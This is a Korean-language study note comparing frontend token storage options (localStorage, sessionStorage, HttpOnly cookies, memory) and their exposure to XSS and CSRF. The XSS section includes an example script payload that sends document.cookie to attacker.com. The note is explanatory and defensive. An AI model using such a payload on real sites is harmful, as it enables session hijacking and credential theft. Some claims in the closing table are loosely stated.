# 🔎 토큰의 저장 방식
> 프론트엔드에서 토큰을 저장하는 방식은 보안과 사용자 경험에서 중요한 문제이다! 로그인 구현에 앞서, 어떤 방식들이 있고 어떤 장/단점들이 있는지 확인해볼 필요가 있다.

## 📍 LocalStorage
```
localStorage.setItem("accessToken", token);
```
- ✅ 장점
  - 구현이 간단하고 빠르다.
  - JS코드에서 언제든 접근 가능하다
- ❌ 단점
  - 그렇기에 XSS 공격에 취약하다.
  - 자동으로 요청에 포함되지 않아 직접 헤더에 넣어야 한다.

### ☠️ XSS 공격 : Cross-Site Scripting
- 웹 페이지에 악의적인 스크립트가 삽입되어 실행되는 공격
- 예시
  ```
  안녕하세요! <script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>
  ```
  - 이런 글이 게시판에 올라오면, 이 글을 열면 해당 사용자의 쿠키가 공격자의 서버로 전송 => **쿠키**에 AccessToken이 들어있으면 세션 탈취로 이어질 수 있다.
- 즉, 공격 방식은 댓글,게시글,채팅 입력란에 `<script>` 같은 JS를 삽입해서 HTML을 렌더링 할 때, 이 스크립트가 실제로 실행되게 하는 방식이다.

### ☠️ CSRF 공격 : Cross-Site Request Forgery
- 사용자가 로그인 상태인 웹사이트에 대해, 공격자가 의도하지 않은 요청을 보내는 것으로 사용자도 모르게 요청이 보내지는 방식 -> **사용자가 로그인한 걸 이용해서 몰래 서버에 요청을 보내는 공격**
- 이는 사용자의 브라우저가 쿠키를 자동 포함하기 떄문에 발생
  
## 📍 SessionStorage
```
sessionStorage.setItem("accessToken", token);
```
- ✅ 장점
  - 탭 단위로 격리된다. -> 브라우저 탭 닫으면 사라짐
  - LocalStorage보다 조금 더 안전한 UX (자동 로그아웃)
- ❌ 단점
  - 하지만 똑같이 XSS 공격에 취약하다.
  - 탭마다 로그인이 필요할 수 있다.(불편)

## 📍 HttpOnly 쿠키
> 서버가 `Set-Cookie` 로 설정하는 방식으로 프론트는 직접 쿠키에 접근하지 못하고, 요청 시 자동 포함 되는 방식이다.
```
Set-Cookie: refreshToken=xxxx; HttpOnly; Secure; SameSite=None;
```
- ✅ 장점
  - XSS로부터 보호된다.
  - 요청 시 자동 포함되므로 구현이 간결하다.
- ❌ 단점
  - CORS 설정이 까다롭다.
  - CSRF 공격에 대비한 추가 조치 필요

## ⚠️ 일반적인 보안에서의 베스트 조합?
- AccessToken : JavaScript 메모리 (XSS 대비 필요하지만, 만료가 짧아서 위험도가 낮다)
- RefreshToken : HttpOnly 쿠키
- 즉, AccessToken은 클라이언트가 관리하고 RefreshToken은 서버가 안전하기 관리하는 방식의 조합

<br>

---

## 📍 메모리 저장
- 어딘가에 저장하지 않고, JS 변수나 상태 안에만 잠깐 보관
```ts
let accessToken = null;

function login() {
  // 로그인 후 응답 받은 accessToken을 변수에 저장
  accessToken = 'eyJhbGciOiJIUzI1...';
}

function callApi() {
  axios.get('/api/user', {
    headers: {
      Authorization: `Bearer ${accessToken}`
    }
  });
}
```
- 이렇게 보관할시, 페이지를 새로고침하거나 닫으면 날아가는 **휘발성 저장 방식**

### 🧠 왜 메모리에 저장할까?
- XSS 공격을 피할 수 있음
- localStorage, sessionStorage는 document로 접근 가능한데, JS 메모리는 외부에서 훔치기 더 어려움
- 단기 인증에 유리함 (SPA 기반 + 짧은 로그인 세션)
- React/Redux/Zustand 등 상태 관리와 조합해서 쓰기 쉬움

### 🔎 흐름
```
[새로고침]
    ↓
[AccessToken 휘발]
    ↓
[API 요청 → 401]
    ↓
[인터셉터: /auth/token/refresh 요청]
    ↓
[서버: RefreshToken으로 검증 후 새 AccessToken 발급]
    ↓
[프론트: 새 AccessToken 저장, 원래 API 재요청]
    ↓
[정상 응답]
```
- 설정만 잘해두면 사용자가 불편을 느끼지 않고 재빠르게 토큰 재발급도 하고 보안도 강화!!


## ✨ 차이 비교

| 항목 | 메모리 (JS 변수) | localStorage | sessionStorage | Cookie (JS 접근 가능) | HttpOnly Cookie |
|------|------------------|---------------|----------------|------------------------|------------------|
| 지속성 | ❌ 새로고침 시 사라짐 | ✅ 브라우저 꺼도 유지 | ❌ 탭 닫히면 사라짐 | ✅ 지속성 선택 가능 | ✅ 서버 설정에 따름 |
| JS 접근 | ✅ 가능 | ✅ 가능 | ✅ 가능 | ✅ 가능 | ❌ JS에서 접근 불가 |
| 보안 | 🔒 상대적으로 안전 (XSS 덜 탐지됨) | ❌ XSS에 취약 | ❌ XSS에 취약 | ❌ XSS에 취약 | ✅ XSS 방어 가능 |
| CSRF 방어 | ❌ 직접 보호 안됨 | ❌ | ❌ | ❌ | ✅ 쿠키 자동 전송 + CSRF 방어 가능 |
| 편의성 | 직접 관리 필요 | 사용 쉬움 | 사용 쉬움 | 자동 전송 가능 | 자동 전송 가능 |
